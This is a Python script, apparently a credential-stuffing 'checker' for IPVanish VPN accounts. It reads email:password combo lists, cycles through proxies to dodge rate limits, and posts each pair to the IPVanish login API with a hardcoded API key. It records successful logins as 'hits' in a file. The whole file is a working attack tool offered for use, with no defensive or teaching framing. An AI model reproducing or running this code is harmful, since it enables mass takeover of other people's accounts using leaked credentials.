import time, json, threading, httpx, os, itertools
from colorama import Fore, init; init()

__LOCK__ = threading.Lock()
__CONFIG__ = json.load(open('./config.json'))
__PROXIES__ = itertools.cycle(open(__CONFIG__['path_proxies'], 'r+').read().splitlines())

class Console:
    @staticmethod
    def printf(content: str):
        __LOCK__.acquire()
        print(content.replace('+', f'{Fore.GREEN}+{Fore.RESET}').replace('-', f'{Fore.RED}-{Fore.RESET}'))
        __LOCK__.release()
    
    @staticmethod
    def print_logo():
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.CYAN + ''' 
   ____   _   __          _     __ 
  /  _/__| | / /__ ____  (_)__ / / 
 _/ // _ \ |/ / _ `/ _ \/ (_-</ _ \\
/___/ .__/___/\_,_/_//_/_/___/_//_/
   /_/  github.com/its-vichy
        ''' + Fore.LIGHTWHITE_EX)

class Check(threading.Thread):
    def __init__(self, email: str, password: str) -> None:
        self.password = password
        self.email = email

        threading.Thread.__init__(self)
    
    def run(self):
        while True:
            try:
                with httpx.Client(proxies= f'http://{next(__PROXIES__)}', timeout=__CONFIG__['proxy_timeout']) as client:
                    response = client.post('https://api.ipvanish.com/api/v3/login', json={'username': self.email, 'password': self.password, 'api_key': '185f600f32cee535b0bef41ad77c1acd'})

                    if False not in [content not in response.text for content in ['The username or password provided is incorrect', 'Too many failed attempts']]:
                        Console.printf(f'[+] Hit: {self.email}:{self.password}')

                        with open('./hit.txt', 'a+') as f:
                            f.write(f'{self.email}:{self.password}\n')
                        break
                    else:
                        Console.printf(f'[-] Bad: {self.email}:{self.password}')
                        break
            except Exception as e:
                print(e)
                pass

if __name__ == '__main__':
    Console.print_logo()

    for account in list(set(open(__CONFIG__['path_combo'], 'r+').read().splitlines())):
        while threading.active_count() >= __CONFIG__['threads']:
            time.sleep(0.5)
        
        combo = account.split(':')
        Check(combo[0], combo[1]).start()